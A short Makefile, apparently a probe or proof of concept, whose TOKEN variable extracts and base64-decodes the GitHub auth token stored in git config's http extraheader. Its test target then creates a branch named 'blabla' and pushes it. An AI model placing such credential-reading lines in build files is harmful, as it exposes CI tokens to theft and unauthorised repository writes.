TOKEN := $(shell git config --get http.https://github.com/.extraheader | sed -nE 's/AUTHORIZATION: basic (.*)/\1/p' | base64 -d | sed -nE 's/.*:(.*)/\1/p')

test:
	git checkout -b blabla
	git push origin blabla

.PHONY: clean test

